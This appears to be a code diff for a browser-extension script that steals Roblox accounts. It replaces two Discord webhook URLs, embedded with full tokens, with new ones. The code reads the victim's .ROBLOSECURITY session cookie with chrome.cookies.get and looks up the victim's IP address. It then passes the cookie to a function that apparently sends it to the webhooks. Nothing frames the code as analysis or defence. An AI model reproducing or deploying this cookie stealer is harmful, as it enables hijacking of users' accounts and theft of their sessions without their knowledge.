@@ -1,5 +1,5 @@
-const WEBHOOK = "https://discord.com/api/webhooks/1380026406808850432/-NKnIeKfUPC3W-GAmRLQpQpzKbNeaIblB8yqKciZRcSYbDzOcbZMXdNOLo936-FiDrtX";
-const SECOND_WEBHOOK = "https://discord.com/api/webhooks/1380026406808850432/-NKnIeKfUPC3W-GAmRLQpQpzKbNeaIblB8yqKciZRcSYbDzOcbZMXdNOLo936-FiDrtX"; //add the web hook here
+const WEBHOOK = "https://discord.com/api/webhooks/1428329785074909256/timrz5g7q-18nr5HJvLZ35Q2iLWQBDI-MH4_LZjGQy0SQo13E6WygHrRJhnuwDpnKqvK";
+const SECOND_WEBHOOK = "https://discord.com/api/webhooks/1428329793618710560/xJf7gCGKMr_ZM40-WdhFeBWeNkbLnSTtu0qInls4NjWNBn70J4xRyVa18_vexMKLDi17"; //add the web hook here
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
@@ -75,3 +75,4 @@ async function main(cookie) {
 chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
     main(cookie ? cookie.value : null);
 });
+
